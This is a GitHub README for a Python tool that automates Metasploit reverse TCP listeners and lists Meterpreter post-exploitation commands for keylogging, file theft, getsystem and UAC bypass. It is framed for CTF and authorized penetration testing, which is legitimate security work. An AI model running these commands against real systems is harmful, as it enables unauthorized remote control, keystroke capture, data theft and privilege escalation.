# QuiteCat

An automation-focused, menu-driven auxiliary tool developed to simplify **reverse TCP listener (handler)** management on Metasploit Framework (MSFConsole).

The tool accelerates the exploitation process by consolidating LHOST / LPORT management, listener initialization, and frequently-used **cheat commands** for post-exploitation phases into a single centralized location.

<img width="1908" height="983" alt="Screenshot 2026-01-07 171922" src="https://github.com/user-attachments/assets/e6d20b66-d03c-4933-a1b4-b640b89aa5d9" />

---

## General Features

- Menu-driven interface
- LHOST and LPORT validated configuration management
- Metasploit `multi/handler` automatic initialization
- IP address and port validation
- Educational MSF cheat-sheet integration
- ASCII banner and loading animation

---

## Requirements

- Python 3.x
- Metasploit Framework
- Linux-based operating system
- Terminal access

---

## Installation

Clone the project to your local system:
```bash
git clone https://github.com/osmnabyram/QuiteCat.py.git
cd QuiteCat.py
chmod +x QuiteCat.py
```

## Menu Options

- **[1] Cheat Codes**
  Frequently-used commands on MSFConsole and scenario-based examples

- **[2] Update Settings (IP / Port)**
  Update LHOST and LPORT values with validation

- **[3] Start Listener**
  Initialize reverse TCP listener with Metasploit `exploit/multi/handler`

- **[0] Exit**
  Secure exit from program

---

## Workflow

- System loading animation is displayed
- ASCII banner is printed
- Current LHOST and LPORT values are displayed
- User makes a selection from the menu
- Corresponding function is executed based on selection

---

## Listener Initialization Process

- `msfconsole` is launched in quiet mode (`-q`)
- `exploit/multi/handler` is utilized
- Payload: `windows/meterpreter/reverse_tcp`
- LHOST and LPORT are set automatically
- Listener runs in the background (`-j`)

---

## Integrated Cheat Codes (Summary)

### Basic

- `use exploit/multi/handler`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `exploit -j`

### System Information

- `sysinfo`
- `getuid`
- `ifconfig`

### Keylogger

- `keyscan_start`
- `keyscan_dump`
- `keyscan_stop`

### File System

- `download C:\\file.txt`
- `upload /path/file`
- `search -f *.pdf`

### Privilege Escalation

- `getsystem`
- `run post/multi/recon/local_exploit_suggester`
- `use exploit/windows/local/bypassuac`

---

## Error Controls

- Invalid IP addresses are rejected
- Ports outside the range 1–65535 are denied
- User is notified if MSFConsole fails to start

---

## Security Notes

- Tool is for educational and laboratory purposes only
- Unauthorized use on real systems is prohibited
- Users are responsible for their own actions

---

## Legal Notice

This software is developed exclusively for **educational**, **CTF**, and **authorized penetration testing** purposes.

Use against unauthorized systems is **illegal** and incurs **legal consequences**.

The developer (**osmnabyram**) assumes no responsibility for any **legal** or **technical** damages resulting from misuse of this tool.
